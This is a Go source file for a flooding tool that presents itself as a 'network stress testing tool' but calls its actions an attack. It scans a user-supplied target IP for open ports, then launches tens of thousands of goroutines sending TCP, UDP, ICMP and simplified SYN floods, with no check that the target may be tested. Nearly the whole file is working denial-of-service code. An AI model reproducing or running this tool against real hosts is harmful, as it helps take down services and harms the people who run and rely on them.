package main
import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)
var (
	targetIP      string
	targetPorts   string
	mode          string
	tcpThreads    int
	udpThreads    int
	icmpThreads   int
	synThreads    int
	tcpRate       int
	udpRate       int
	udpSize       int
	icmpSize      int
	synRate       int
	verbose       bool
	scanTimeout   time.Duration
	scanRange     string
	maxPort       int
	minPort       int
	attackMethods []string
)
func init() {
	flag.StringVar(&targetIP, "target", "", "Target IP (e.g., 192.168.1.1)")
	flag.StringVar(&targetPorts, "ports", "", "Target ports (e.g., 80,443 or 1-1000 or 'all')")
	flag.StringVar(&mode, "mode", "auto", "Scan mode: auto, single, range, all")
	flag.IntVar(&tcpThreads, "tcp-threads", 100000, "Number of TCP flood goroutines")
	flag.IntVar(&udpThreads, "udp-threads", 50000, "Number of UDP flood goroutines")
	flag.IntVar(&icmpThreads, "icmp-threads", 20000, "Number of ICMP flood goroutines")
	flag.IntVar(&synThreads, "syn-threads", 80000, "Number of SYN flood goroutines")
	flag.IntVar(&tcpRate, "tcp-rate", 100000, "TCP packets per second per thread (0 = unlimited)")
	flag.IntVar(&udpRate, "udp-rate", 50000, "UDP packets per second per thread (0 = unlimited)")
	flag.IntVar(&synRate, "syn-rate", 80000, "SYN packets per second per thread (0 = unlimited)")
	flag.IntVar(&udpSize, "udp-size", 204800, "UDP payload size (bytes)")
	flag.IntVar(&icmpSize, "icmp-size", 1024, "ICMP payload size (bytes)")
	flag.BoolVar(&verbose, "verbose", false, "Enable verbose logging")
	flag.DurationVar(&scanTimeout, "scan-timeout", 2*time.Second, "Timeout for port scanning")
	flag.StringVar(&scanRange, "scan-range", "1-1000", "Port range for scanning (e.g., 1-65535)")
	flag.IntVar(&minPort, "min-port", 1, "Minimum port for scanning")
	flag.IntVar(&maxPort, "max-port", 65535, "Maximum port for scanning")
	flag.Parse()
	// Interactive setup if no target specified
	if targetIP == "" {
  interactiveSetup()
	}
}
// interactiveSetup prompts user for configuration
func interactiveSetup() {
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Println("=== Network Stress Testing Tool ===")
	fmt.Print("Enter target IP address: ")
	scanner.Scan()
	targetIP = strings.TrimSpace(scanner.Text())
	fmt.Print("Enter target ports (e.g., 80,443 or 1-1000 or 'all') [default: auto]: ")
	scanner.Scan()
	input := strings.TrimSpace(scanner.Text())
	if input != "" {
  targetPorts = input
	}
	fmt.Print("Select attack methods (comma separated): tcp,udp,icmp,syn [default: tcp,udp]: ")
	scanner.Scan()
	methodInput := strings.TrimSpace(scanner.Text())
	if methodInput == "" {
  methodInput = "tcp,udp"
	}
	attackMethods = strings.Split(methodInput, ",")
	fmt.Print("Enable verbose output? (y/n) [default: n]: ")
	scanner.Scan()
	verboseInput := strings.TrimSpace(scanner.Text())
	verbose = strings.ToLower(verboseInput) == "y"
	fmt.Print("TCP threads [" + strconv.Itoa(tcpThreads) + "]: ")
	scanner.Scan()
	if t, err := strconv.Atoi(strings.TrimSpace(scanner.Text())); err == nil && t > 0 {
  tcpThreads = t
	}
	fmt.Print("UDP threads [" + strconv.Itoa(udpThreads) + "]: ")
	scanner.Scan()
	if t, err := strconv.Atoi(strings.TrimSpace(scanner.Text())); err == nil && t > 0 {
  udpThreads = t
	}
	fmt.Print("ICMP threads [" + strconv.Itoa(icmpThreads) + "]: ")
	scanner.Scan()
	if t, err := strconv.Atoi(strings.TrimSpace(scanner.Text())); err == nil && t > 0 {
  icmpThreads = t
	}
	fmt.Print("SYN threads [" + strconv.Itoa(synThreads) + "]: ")
	scanner.Scan()
	if t, err := strconv.Atoi(strings.TrimSpace(scanner.Text())); err == nil && t > 0 {
  synThreads = t
	}
	fmt.Println("Configuration complete. Starting attack...")
}
// parsePorts converts port input into slice of integers
func parsePorts(portStr string) ([]int, error) {
	var ports []int
	if portStr == "all" {
  for i := 1; i <= 65535; i++ {
   ports = append(ports, i)
  }
  return ports, nil
	}
	// Check if it's a range
	if strings.Contains(portStr, "-") {
  parts := strings.Split(portStr, "-")
  if len(parts) != 2 {
   return nil, fmt.Errorf("invalid port range format")
  }
  start, err := strconv.Atoi(parts[0])
  if err != nil {
   return nil, err
  }
  end, err := strconv.Atoi(parts[1])
  if err != nil {
   return nil, err
  }
  for i := start; i <= end; i++ {
   ports = append(ports, i)
  }
  return ports, nil
	}
	// Parse comma-separated ports
	portList := strings.Split(portStr, ",")
	for _, p := range portList {
  port, err := strconv.Atoi(strings.TrimSpace(p))
  if err != nil {
   return nil, err
  }
  ports = append(ports, port)
	}
	return ports, nil
}
// scanSpecificPorts scans provided ports
func scanSpecificPorts(ports []int) (tcpPorts, udpPorts []int) {
	var wg sync.WaitGroup
	var mutex sync.Mutex
	// Scan TCP ports
	for _, port := range ports {
  wg.Add(1)
  go func(p int) {
   defer wg.Done()
   target := fmt.Sprintf("%s:%d", targetIP, p)
   conn, err := net.DialTimeout("tcp", target, scanTimeout)
   if err == nil {
    mutex.Lock()
    tcpPorts = append(tcpPorts, p)
    mutex.Unlock()
    conn.Close()
    if verbose {
     fmt.Printf("[TCP] Port %d is open\n", p)
    }
   } else if verbose {
    fmt.Printf("[TCP] Port %d is closed\n", p)
   }
  }(port)
	}
	// Scan UDP ports
	for _, port := range ports {
  wg.Add(1)
  go func(p int) {
   defer wg.Done()
   target := fmt.Sprintf("%s:%d", targetIP, p)
   conn, err := net.DialTimeout("udp", target, scanTimeout)
   if err == nil {
    mutex.Lock()
    udpPorts = append(udpPorts, p)
    mutex.Unlock()
    conn.Close()
    if verbose {
     fmt.Printf("[UDP] Port %d is open\n", p)
    }
   } else if verbose {
    fmt.Printf("[UDP] Port %d is closed/filtered\n", p)
   }
  }(port)
	}
	wg.Wait()
	return tcpPorts, udpPorts
}
// scanPortRange scans ports in a range
func scanPortRange(start, end int) (tcpPorts, udpPorts []int) {
	var wg sync.WaitGroup
	var mutex sync.Mutex
	// Scan TCP ports
	for port := start; port <= end; port++ {
  wg.Add(1)
  go func(p int) {
   defer wg.Done()
   target := fmt.Sprintf("%s:%d", targetIP, p)
   conn, err := net.DialTimeout("tcp", target, scanTimeout)
   if err == nil {
    mutex.Lock()
    tcpPorts = append(tcpPorts, p)
    mutex.Unlock()
    conn.Close()
    if verbose {
     fmt.Printf("[TCP] Port %d is open\n", p)
    }
   }
  }(port)
	}
	// Scan UDP ports
	for port := start; port <= end; port++ {
  wg.Add(1)
  go func(p int) {
   defer wg.Done()
   target := fmt.Sprintf("%s:%d", targetIP, p)
   conn, err := net.DialTimeout("udp", target, scanTimeout)
   if err == nil {
    mutex.Lock()
    udpPorts = append(udpPorts, p)
    mutex.Unlock()
    conn.Close()
    if verbose {
     fmt.Printf("[UDP] Port %d is open\n", p)
    }
   }
  }(port)
	}
	wg.Wait()
	return tcpPorts, udpPorts
}
// scanAllPorts scans all 65535 ports
func scanAllPorts() (tcpPorts, udpPorts []int) {
	return scanPortRange(1, 65535)
}
// getTargetPorts determines which ports to attack based on flags
func getTargetPorts() ([]int, []int, error) {
	switch mode {
	case "single":
  if targetPorts == "" {
   return nil, nil, fmt.Errorf("ports required for single mode")
  }
  ports, err := parsePorts(targetPorts)
  if err != nil {
   return nil, nil, err
  }
  tcp, udp := scanSpecificPorts(ports)
  return tcp, udp, nil
	case "range":
  var start, end int
  fmt.Sscanf(scanRange, "%d-%d", &start, &end)
  tcp, udp := scanPortRange(start, end)
  return tcp, udp, nil
	case "all":
  tcp, udp := scanAllPorts()
  return tcp, udp, nil
	case "auto":
  fallthrough
	default:
  // Auto-detect common ports if none specified
  if targetPorts == "" {
   // Common service ports
   commonPorts := []int{21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5900, 8080}
   tcp, udp := scanSpecificPorts(commonPorts)
   return tcp, udp, nil
  }
  ports, err := parsePorts(targetPorts)
  if err != nil {
   return nil, nil, err
  }
  tcp, udp := scanSpecificPorts(ports)
  return tcp, udp, nil
	}
}
// tcpFlood performs TCP flood attack
func tcpFlood(wg *sync.WaitGroup, stopChan <-chan struct{}, ports []int) {
	defer wg.Done()
	for {
  select {
  case <-stopChan:
   return
  default:
   for _, port := range ports {
    target := fmt.Sprintf("%s:%d", targetIP, port)
    conn, err := net.DialTimeout("tcp", target, 2*time.Second)
    if err != nil {
     if verbose {
      fmt.Printf("[TCP] Error on port %d: %v\n", port, err)
     }
     continue
    }
    // Send random data
    data := make([]byte, 1024)
    rand.Read(data)
    conn.Write(data)
    conn.Close()
    if verbose {
     fmt.Printf("[TCP] Sent to port %d\n", port)
    }
   }
   if tcpRate > 0 {
    time.Sleep(time.Second / time.Duration(tcpRate))
   }
  }
	}
}
// udpFlood performs UDP flood attack
func udpFlood(wg *sync.WaitGroup, stopChan <-chan struct{}, ports []int) {
	defer wg.Done()
	rand.Seed(time.Now().UnixNano())
	payload := make([]byte, udpSize)
	for {
  select {
  case <-stopChan:
   return
  default:
   for _, port := range ports {
    target := fmt.Sprintf("%s:%d", targetIP, port)
    conn, err := net.DialTimeout("udp", target, 2*time.Second)
    if err != nil {
     if verbose {
      fmt.Printf("[UDP] Error on port %d: %v\n", port, err)
     }
     continue
    }
    rand.Read(payload)
    _, err = conn.Write(payload)
    if err != nil && verbose {
     fmt.Printf("[UDP] Send Error on port %d: %v\n", port, err)
    }
    conn.Close()
    if verbose {
     fmt.Printf("[UDP] Sent to port %d\n", port)
    }
   }
   if udpRate > 0 {
    time.Sleep(time.Second / time.Duration(udpRate))
   }
  }
	}
}
// icmpFlood performs ICMP flood attack
func icmpFlood(wg *sync.WaitGroup, stopChan <-chan struct{}) {
	defer wg.Done()
	payload := make([]byte, icmpSize)
	rand.Read(payload)
	for {
  select {
  case <-stopChan:
   return
  default:
   // Note: This is a simplified ICMP implementation
   // In practice, raw sockets would be needed for true ICMP flooding
   conn, err := net.DialTimeout("ip4:icmp", targetIP, 2*time.Second)
   if err != nil {
    if verbose {
     fmt.Printf("[ICMP] Error: %v\n", err)
    }
    continue
   }
   _, err = conn.Write(payload)
   if err != nil && verbose {
    fmt.Printf("[ICMP] Send Error: %v\n", err)
   }
   conn.Close()
   if verbose {
    fmt.Printf("[ICMP] Packet sent\n")
   }
   // Rate limiting
   time.Sleep(10 * time.Millisecond)
  }
	}
}
// synFlood performs SYN flood attack
func synFlood(wg *sync.WaitGroup, stopChan <-chan struct{}, ports []int) {
	defer wg.Done()
	for {
  select {
  case <-stopChan:
   return
  default:
   for _, port := range ports {
    // Simplified SYN flood simulation
    // In practice, this would require raw sockets to craft SYN packets
    target := fmt.Sprintf("%s:%d", targetIP, port)
    conn, err := net.DialTimeout("tcp", target, 2*time.Second)
    if err != nil {
     if verbose {
      fmt.Printf("[SYN] Error on port %d: %v\n", port, err)
     }
     continue
    }
    // Immediately close without completing handshake
    conn.Close()
    if verbose {
     fmt.Printf("[SYN] Sent to port %d\n", port)
    }
   }
   if synRate > 0 {
    time.Sleep(time.Second / time.Duration(synRate))
   }
  }
	}
}
func main() {
	fmt.Printf("Starting Network Stress Test on %s\n", targetIP)
	// Determine target ports
	tcpPorts, udpPorts, err := getTargetPorts()
	if err != nil {
  fmt.Printf("Error determining target ports: %v\n", err)
  os.Exit(1)
	}
	if len(tcpPorts) == 0 && len(udpPorts) == 0 && !contains(attackMethods, "icmp") {
  fmt.Println("No open ports found and ICMP not selected. Exiting.")
  os.Exit(1)
	}
	fmt.Printf("Open TCP Ports: %v\n", tcpPorts)
	fmt.Printf("Open UDP Ports: %v\n", udpPorts)
	var wg sync.WaitGroup
	stopChan := make(chan struct{})
	// Handle Ctrl+C for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
  <-sigChan
  fmt.Println("\nStopping attack...")
  close(stopChan)
	}()
	// Launch selected attack methods
	for _, method := range attackMethods {
  switch strings.ToLower(strings.TrimSpace(method)) {
  case "tcp":
   if len(tcpPorts) > 0 {
    fmt.Printf("Launching %d TCP threads\n", tcpThreads)
    for i := 0; i < tcpThreads; i++ {
     wg.Add(1)
     go tcpFlood(&wg, stopChan, tcpPorts)
    }
   }
  case "udp":
   if len(udpPorts) > 0 {
    fmt.Printf("Launching %d UDP threads\n", udpThreads)
    for i := 0; i < udpThreads; i++ {
     wg.Add(1)
     go udpFlood(&wg, stopChan, udpPorts)
    }
   }
  case "icmp":
   fmt.Printf("Launching %d ICMP threads\n", icmpThreads)
   for i := 0; i < icmpThreads; i++ {
    wg.Add(1)
    go icmpFlood(&wg, stopChan)
   }
  case "syn":
   if len(tcpPorts) > 0 {
    fmt.Printf("Launching %d SYN threads\n", synThreads)
    for i := 0; i < synThreads; i++ {
     wg.Add(1)
     go synFlood(&wg, stopChan, tcpPorts)
    }
   }
  }
	}
	wg.Wait()
	fmt.Println("Attack stopped.")
}
// contains checks if a string slice contains a specific string
func contains(slice []string, item string) bool {
	for _, s := range slice {
  if strings.ToLower(strings.TrimSpace(s)) == strings.ToLower(strings.TrimSpace(item)) {
   return true
  }
	}
	return false
}
